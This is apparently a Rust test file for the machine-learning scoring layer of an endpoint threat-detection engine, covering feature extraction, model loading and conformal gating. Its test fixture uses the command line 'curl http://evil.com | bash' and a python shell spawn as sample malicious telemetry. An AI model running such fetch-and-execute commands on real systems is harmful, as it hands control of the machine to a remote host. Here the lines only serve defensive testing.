use super::math::sigmoid;
use super::*;
use crate::layer5::model::ModelFamily;
use crate::{DetectionSignals, EventClass, TelemetryEvent};

fn make_event(class: EventClass, uid: u32, dst_port: Option<u16>) -> TelemetryEvent {
    TelemetryEvent {
        ts_unix: 1000,
        event_class: class,
        pid: 100,
        ppid: 1,
        uid,
        process: "bash".to_string(),
        parent_process: "sshd".to_string(),
        session_id: 1,
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port,
        dst_ip: None,
        dst_domain: None,
        command_line: Some("curl http://evil.com | bash".to_string()),
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    }
}

fn feature_index(name: &str) -> usize {
    FEATURE_NAMES
        .iter()
        .position(|n| *n == name)
        .expect("feature should exist in FEATURE_NAMES")
}

#[test]
fn default_model_validates() {
    let model = MlModel::default();
    model.validate().unwrap();
    assert_eq!(model.weights.len(), FEATURE_COUNT);
}

#[test]
fn sigmoid_properties() {
    assert!((sigmoid(0.0) - 0.5).abs() < 1e-10);
    assert!(sigmoid(10.0) > 0.999);
    assert!(sigmoid(-10.0) < 0.001);
    // Numerical stability for large values
    assert!(sigmoid(1000.0).is_finite());
    assert!(sigmoid(-1000.0).is_finite());
}

#[test]
fn clean_event_scores_low() {
    let engine = MlEngine::new();
    let event = make_event(EventClass::FileOpen, 1000, None);
    let signals = DetectionSignals {
        z1_exact_ioc: false,
        yara_hit: false,
        z2_temporal: false,
        z3_anomaly_high: false,
        z3_anomaly_med: false,
        z4_kill_chain: false,
        l1_prefilter_hit: false,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
        ..Default::default()
    };
    let features = MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 0, &Default::default());
    let result = engine.score(&features);
    assert!(
        result.score < 0.3,
        "clean event should score low: {}",
        result.score
    );
    assert!(!result.positive);
}

#[test]
fn ioc_hit_scores_high() {
    let engine = MlEngine::new();
    let event = make_event(EventClass::ProcessExec, 0, Some(4444));
    let signals = DetectionSignals {
        z1_exact_ioc: true,
        yara_hit: false,
        z2_temporal: false,
        z3_anomaly_high: false,
        z3_anomaly_med: false,
        z4_kill_chain: false,
        l1_prefilter_hit: true,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
        ..Default::default()
    };
    let features = MlFeatures::extract(&event, &signals, 0, 0, 0, 2, 0, &Default::default());
    let result = engine.score(&features);
    assert!(
        result.score > 0.8,
        "IOC hit should score high: {}",
        result.score
    );
    assert!(result.positive);
}

#[test]
fn multi_layer_agreement_scores_highest() {
    let engine = MlEngine::new();
    let event = make_event(EventClass::ProcessExec, 0, Some(4444));
    let signals = DetectionSignals {
        z1_exact_ioc: true,
        yara_hit: false,
        z2_temporal: true,
        z3_anomaly_high: true,
        z3_anomaly_med: false,
        z4_kill_chain: true,
        l1_prefilter_hit: true,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
        ..Default::default()
    };
    let features = MlFeatures::extract(&event, &signals, 2, 1, 1, 3, 0, &Default::default());
    let result = engine.score(&features);
    assert!(
        result.score > 0.99,
        "multi-layer should score near 1.0: {}",
        result.score
    );
    assert!(result.positive);
}

#[test]
fn anomaly_only_scores_moderate() {
    let engine = MlEngine::new();
    let event = make_event(EventClass::ProcessExec, 1000, None);
    let signals = DetectionSignals {
        z1_exact_ioc: false,
        yara_hit: false,
        z2_temporal: false,
        z3_anomaly_high: true,
        z3_anomaly_med: false,
        z4_kill_chain: false,
        l1_prefilter_hit: false,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
        ..Default::default()
    };
    let features = MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 0, &Default::default());
    let result = engine.score(&features);
    // Anomaly alone should be moderate — not near 1.0, not near 0.0
    assert!(
        result.score > 0.15,
        "anomaly should contribute: {}",
        result.score
    );
    assert!(
        result.score < 0.85,
        "anomaly alone shouldn't be near-certain: {}",
        result.score
    );
}

#[test]
fn model_json_round_trip() {
    let model = MlModel::default();
    let json = serde_json::to_string_pretty(&model).unwrap();
    let loaded = MlModel::from_json(&json).unwrap();
    assert_eq!(loaded.weights.len(), model.weights.len());
    assert_eq!(loaded.bias, model.bias);
    assert_eq!(loaded.threshold, model.threshold);
}

#[test]
fn model_validates_dimension_mismatch() {
    let mut model = MlModel::default();
    model.weights.pop();
    assert!(model.validate().is_err());
}

#[test]
fn model_validates_nan_weight() {
    let mut model = MlModel::default();

    model.weights[0] = f64::NAN;
    assert!(model.validate().is_err());
}

#[test]
fn top_features_are_interpretable() {
    let engine = MlEngine::new();
    let event = make_event(EventClass::ProcessExec, 0, Some(4444));
    let signals = DetectionSignals {
        z1_exact_ioc: true,
        yara_hit: false,
        z2_temporal: true,
        z3_anomaly_high: false,
        z3_anomaly_med: false,
        z4_kill_chain: false,
        l1_prefilter_hit: true,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
        ..Default::default()
    };
    let features = MlFeatures::extract(&event, &signals, 1, 0, 0, 1, 0, &Default::default());
    let result = engine.score(&features);
    // Top features should include z1_ioc_hit
    assert!(
        result
            .top_features
            .iter()
            .any(|(name, _)| name == "z1_ioc_hit"),
        "top features should include IOC hit: {:?}",
        result.top_features
    );
}

#[test]
fn hot_reload_model() {
    let mut engine = MlEngine::new();
    let mut new_model = MlModel {
        model_id: "updated-v2".to_string(),
        ..MlModel::default()
    };
    new_model.weights[0] = 5.0; // boost IOC weight
    engine.reload_model(new_model).unwrap();
    assert_eq!(engine.model_id(), "updated-v2");
}

#[test]
// AC-DET-263 AC-DET-266
fn ml_feature_contract_includes_extended_runtime_and_interaction_terms() {
    let expected = [
        "z1_ioc_hit",
        "z2_temporal_count",
        "z3_anomaly_high",
        "z3_anomaly_med",
        "z4_killchain_count",
        "yara_hit_count",
        "string_sig_count",
        "event_class_risk",
        "uid_is_root",
        "dst_port_risk",
        "has_command_line",
        "cmdline_length_norm",
        "prefilter_hit",
        "multi_layer_count",
        "cmdline_renyi_h2",
        "cmdline_compression",
        "cmdline_min_entropy",
        "cmdline_entropy_gap",
        "dns_entropy",
        "event_size_norm",
        "container_risk",
        "file_path_entropy",
        "file_path_depth",
        "behavioral_alarm_count",
        "z1_z2_interaction",
        "z1_z4_interaction",
        "anomaly_behavioral",
        "process_tree_depth_norm",
        "rare_parent_child_pair",
        "parent_cmdline_hash_risk",
        "parent_child_cmdline_distance",
        "sibling_spawn_burst_norm",
        "sensitive_path_write_velocity",
        "rename_churn_norm",
        "extension_entropy",
        "executable_write_ratio",
        "temp_to_system_write_ratio",
        "conn_fanout_norm",
        "unique_dst_ip_norm",
        "unique_dst_port_norm",
        "beacon_periodicity_score",
        "network_graph_centrality",
        "credential_access_indicator",
        "lsass_access_indicator",
        "sam_access_indicator",
        "token_theft_indicator",
        "lolbin_credential_chain",
        "network_credential_interaction",
        "tree_network_interaction",
        "file_behavior_interaction",
    ];
    assert_eq!(FEATURE_COUNT, expected.len());
    assert_eq!(FEATURE_NAMES, expected);
}

#[test]
fn event_size_normalization_uses_4096_divisor() {
    let mut event = make_event(EventClass::FileOpen, 1000, None);
    event.event_size = Some(2048);
    let signals = DetectionSignals::default();
    let features = MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 0, &Default::default());
    let idx = feature_index("event_size_norm");
    assert!(
        (features.values[idx] - 0.5).abs() < 1e-12,
        "expected 2048/4096=0.5, got {}",
        features.values[idx]
    );
}

#[test]
fn process_tree_v2_features_are_deterministically_non_zero_when_context_exists() {
    let mut event = make_event(EventClass::ProcessExec, 0, Some(4444));
    event.ppid = 2222;
    event.pid = 3333;
    event.parent_process = "python".to_string();
    event.process = "bash".to_string();
    event.command_line = Some("python -c 'import os; os.system(\"bash\")'".to_string());
    let signals = DetectionSignals {
        process_tree_anomaly: true,
        ..Default::default()
    };
    let features = MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 2, &Default::default());

    for name in [
        "process_tree_depth_norm",
        "rare_parent_child_pair",
        "parent_cmdline_hash_risk",
        "parent_child_cmdline_distance",
        "sibling_spawn_burst_norm",
    ] {
        let idx = feature_index(name);
        assert!(
            features.values[idx] > 0.0,
            "{name} should be non-zero with populated process context"
        );
    }
}

#[test]
fn ci_trained_model_converts_to_runtime() {
    // Simulate the JSON that `signature_ml_train_model.py` produces
    let ci_json = r#"{
            "suite": "signature_ml_linear_logit_model",
            "model_type": "linear_logit_v1",
            "model_version": "rules-2026.02.15.ml.v1",
            "trained_at_utc": "2026-02-15T04:30:00Z",
            "features": ["z1_ioc_hit", "z2_temporal_count", "z3_anomaly_high",
                          "string_sig_count", "event_class_risk"],
            "weights": {
                "z1_ioc_hit": 0.35,
                "z2_temporal_count": 0.20,
                "z3_anomaly_high": 0.15,
                "string_sig_count": 0.18,
                "event_class_risk": 0.12
            },
            "feature_scales": {
                "z1_ioc_hit": 1.0,
                "z2_temporal_count": 3.0,
                "z3_anomaly_high": 1.0,
                "string_sig_count": 5.0,
                "event_class_risk": 1.0
            },
            "bias": -0.8,
            "training_samples": 960,
            "positive_samples": 180,
            "negative_samples": 780
        }"#;

    // Should auto-detect CI format
    let model = MlModel::from_json_auto(ci_json).unwrap();
    assert_eq!(model.model_id, "ci-rules-2026.02.15.ml.v1");
    assert_eq!(model.weights.len(), FEATURE_COUNT);
    assert_eq!(model.bias, -0.8);
    assert_eq!(model.threshold, 0.5);

    // z1_ioc_hit (index 0): CI weight 0.35 * scale 1.0 = 0.35
    assert!(
        (model.weights[0] - 0.35).abs() < 1e-10,
        "z1_ioc_hit weight: {}",
        model.weights[0]
    );
    // z2_temporal_count (index 1): CI weight 0.20 * scale 3.0 = 0.60
    assert!(
        (model.weights[1] - 0.60).abs() < 1e-10,
        "z2_temporal_count weight: {}",
        model.weights[1]
    );
    // string_sig_count (index 6): CI weight 0.18 * scale 5.0 = 0.90
    assert!(
        (model.weights[6] - 0.90).abs() < 1e-10,
        "string_sig_count weight: {}",
        model.weights[6]
    );
    // Features NOT in CI model should be 0.0
    assert_eq!(model.weights[9], 0.0, "missing feature should be 0.0"); // dst_port_risk
    assert_eq!(
        model.weights[14], 0.0,
        "info-theoretic features should be 0.0"
    ); // cmdline_renyi_h2

    // Model should be valid and usable
    model.validate().unwrap();
    let mut engine = MlEngine::new();
    engine.reload_model(model).unwrap();
    assert_eq!(engine.model_version(), "rules-2026.02.15.ml.v1");
}

#[test]
fn ci_tree_model_converts_and_scores_with_tree_engine() {
    let ci_json = r#"{
            "suite": "signature_ml_tree_ensemble_model",
            "model_type": "gbdt_tree_ensemble_v1",
            "model_version": "rules-2026.03.04.ml.tree.v1",
            "features": ["z1_ioc_hit", "z2_temporal_count"],
            "weights": {"z1_ioc_hit": 0.1, "z2_temporal_count": 0.1},
            "feature_scales": {"z1_ioc_hit": 1.0, "z2_temporal_count": 1.0},
            "bias": 0.0,
            "base_score": -0.4,
            "threshold": 0.5,
            "trees": [
                {
                    "weight": 1.0,
                    "nodes": [
                        {"id":0,"feature":"z1_ioc_hit","threshold":0.5,"left":1,"right":2},
                        {"id":1,"leaf":-0.2},
                        {"id":2,"leaf":1.2}
                    ]
                }
            ]
        }"#;

    let model = MlModel::from_json_auto(ci_json).unwrap();
    assert_eq!(model.family, ModelFamily::GbdtTree);
    assert_eq!(model.trees.len(), 1);

    let mut engine = MlEngine::new();
    engine.reload_model(model).unwrap();

    let event = make_event(EventClass::ProcessExec, 0, None);
    let signals = DetectionSignals {
        z1_exact_ioc: true,
        ..Default::default()
    };
    let f = MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 0, &Default::default());
    let s = engine.score(&f);
    assert!(
        s.score > 0.6,
        "tree engine should produce elevated score, got {}",
        s.score
    );
}

#[test]
// AC-DET-267
fn ci_threshold_passthrough_uses_ci_value_and_bounds_fallback() {
    let valid_threshold_json = r#"{
            "suite": "signature_ml_linear_logit_model",
            "model_type": "linear_logit_v1",
            "model_version": "rules-2026.02.21.ml.v1",
            "trained_at_utc": "2026-02-21T04:30:00Z",
            "features": ["z1_ioc_hit"],
            "weights": { "z1_ioc_hit": 0.5 },
            "feature_scales": { "z1_ioc_hit": 1.0 },
            "bias": -0.2,
            "threshold": 0.7,
            "training_samples": 100,
            "positive_samples": 30,
            "negative_samples": 70
        }"#;
    let model = MlModel::from_json_auto(valid_threshold_json).unwrap();
    assert_eq!(model.threshold, 0.7);

    let invalid_threshold_json = r#"{
            "suite": "signature_ml_linear_logit_model",
            "model_type": "linear_logit_v1",
            "model_version": "rules-2026.02.21.ml.v1",
            "trained_at_utc": "2026-02-21T04:30:00Z",
            "features": ["z1_ioc_hit"],
            "weights": { "z1_ioc_hit": 0.5 },
            "feature_scales": { "z1_ioc_hit": 1.0 },
            "bias": -0.2,
            "threshold": 0.99,
            "training_samples": 100,
            "positive_samples": 30,
            "negative_samples": 70
        }"#;
    let model = MlModel::from_json_auto(invalid_threshold_json).unwrap();
    assert_eq!(model.threshold, 0.5);
}

#[test]
// AC-DET-268
fn ci_model_validation_rejects_empty_features_non_finite_and_bad_scales() {
    let empty_features = CiTrainedModel {
        suite: "signature_ml_linear_logit_model".to_string(),
        model_type: "linear_logit_v1".to_string(),
        model_version: "v1".to_string(),
        features: vec![],
        weights: std::collections::HashMap::new(),
        feature_scales: std::collections::HashMap::new(),
        bias: 0.0,
        training_samples: 10,
        positive_samples: 5,
        negative_samples: 5,
        threshold: None,
        calibration_scores: None,
        base_score: None,
        trees: None,
    };
    assert!(empty_features.validate().is_err());

    let non_finite_weight = CiTrainedModel {
        suite: "signature_ml_linear_logit_model".to_string(),
        model_type: "linear_logit_v1".to_string(),
        model_version: "v1".to_string(),
        features: vec!["z1_ioc_hit".to_string()],
        weights: std::collections::HashMap::from([("z1_ioc_hit".to_string(), f64::NAN)]),
        feature_scales: std::collections::HashMap::from([("z1_ioc_hit".to_string(), 1.0)]),
        bias: 0.0,
        training_samples: 10,
        positive_samples: 5,
        negative_samples: 5,
        threshold: None,
        calibration_scores: None,
        base_score: None,
        trees: None,
    };
    assert!(non_finite_weight.validate().is_err());

    let bad_scale = CiTrainedModel {
        suite: "signature_ml_linear_logit_model".to_string(),
        model_type: "linear_logit_v1".to_string(),
        model_version: "v1".to_string(),
        features: vec!["z1_ioc_hit".to_string()],
        weights: std::collections::HashMap::from([("z1_ioc_hit".to_string(), 0.2)]),
        feature_scales: std::collections::HashMap::from([("z1_ioc_hit".to_string(), 1e-12)]),
        bias: 0.0,
        training_samples: 10,
        positive_samples: 5,
        negative_samples: 5,
        threshold: None,
        calibration_scores: None,
        base_score: None,
        trees: None,
    };
    assert!(bad_scale.validate().is_err());

    let non_finite_bias = CiTrainedModel {
        suite: "signature_ml_linear_logit_model".to_string(),
        model_type: "linear_logit_v1".to_string(),
        model_version: "v1".to_string(),
        features: vec!["z1_ioc_hit".to_string()],
        weights: std::collections::HashMap::from([("z1_ioc_hit".to_string(), 0.2)]),
        feature_scales: std::collections::HashMap::from([("z1_ioc_hit".to_string(), 1.0)]),
        bias: f64::INFINITY,
        training_samples: 10,
        positive_samples: 5,
        negative_samples: 5,
        threshold: None,
        calibration_scores: None,
        base_score: None,
        trees: None,
    };
    assert!(non_finite_bias.validate().is_err());
}

#[test]
// AC-DET-269
fn ci_model_conversion_tracks_feature_mapping_mismatches() {
    let ci = CiTrainedModel {
        suite: "signature_ml_linear_logit_model".to_string(),
        model_type: "linear_logit_v1".to_string(),
        model_version: "v1".to_string(),
        features: vec!["z1_ioc_hit".to_string(), "ci_only_feature".to_string()],
        weights: std::collections::HashMap::from([
            ("z1_ioc_hit".to_string(), 0.5),
            ("ci_only_feature".to_string(), 0.3),
        ]),
        feature_scales: std::collections::HashMap::from([
            ("z1_ioc_hit".to_string(), 1.0),
            ("ci_only_feature".to_string(), 1.0),
        ]),
        bias: 0.0,
        training_samples: 10,
        positive_samples: 5,
        negative_samples: 5,
        threshold: Some(0.4),
        calibration_scores: None,
        base_score: None,
        trees: None,
    };
    let runtime = ci.to_runtime_model();
    assert_eq!(runtime.ci_features_dropped, 1);
    assert!(runtime.runtime_features_unmapped > 0);
}

#[test]
fn ci_trained_model_auto_detect_vs_native() {
    // Native format should still work via from_json_auto
    let native_json = serde_json::to_string(&MlModel::default()).unwrap();
    let model = MlModel::from_json_auto(&native_json).unwrap();
    assert_eq!(model.weights.len(), FEATURE_COUNT);
    model.validate().unwrap();
}

#[test]
fn conformal_gates_borderline_raw_positive_scores() {
    let model = MlModel {
        model_id: "conformal-gate-test".to_string(),
        model_version: "1.0.0".to_string(),
        weights: vec![0.0; FEATURE_COUNT],
        bias: 0.0,
        threshold: 0.5,
        feature_names: FEATURE_NAMES.iter().map(|name| name.to_string()).collect(),
        ci_features_dropped: 0,
        runtime_features_unmapped: 0,
        family: ModelFamily::Linear,
        tree_base_score: 0.0,
        trees: Vec::new(),
    };
    let engine = MlEngine::with_model_and_calibration(model, vec![0.7, 0.8, 0.9], 0.1);

    let event = make_event(EventClass::FileOpen, 1000, None);
    let signals = DetectionSignals::default();
    let features = MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 0, &Default::default());

    let result = engine.score(&features);
    assert!(
        (result.score - 0.5).abs() < 1e-12,
        "expected sigmoid(0)=0.5"
    );
    assert!(result.raw_positive, "raw threshold should pass at 0.5");
    assert!(
        result.conformal_gated,
        "conformal gate should suppress borderline score"
    );
    assert!(!result.positive, "final decision should be gated negative");
    assert!(
        result.decision_threshold >= 0.8,
        "effective threshold should reflect conformal quantile"
    );
    assert!(
        result.conformal_p_value.is_some(),
        "p-value should be emitted"
    );
}

#[test]
fn no_calibration_keeps_raw_decision_path() {
    let model = MlModel {
        model_id: "raw-decision-test".to_string(),
        model_version: "1.0.0".to_string(),
        weights: vec![0.0; FEATURE_COUNT],
        bias: 0.0,
        threshold: 0.5,
        feature_names: FEATURE_NAMES.iter().map(|name| name.to_string()).collect(),
        ci_features_dropped: 0,
        runtime_features_unmapped: 0,
        family: ModelFamily::Linear,
        tree_base_score: 0.0,
        trees: Vec::new(),
    };
    let engine = MlEngine::with_model(model);

    let event = make_event(EventClass::FileOpen, 1000, None);
    let signals = DetectionSignals::default();
    let features = MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 0, &Default::default());

    let result = engine.score(&features);
    assert!(result.raw_positive);
    assert!(
        result.positive,
        "without conformal calibration decision is raw threshold"
    );
    assert!(!result.conformal_gated);
    assert!(result.conformal_p_value.is_none());
    assert!((result.decision_threshold - 0.5).abs() < 1e-12);
}
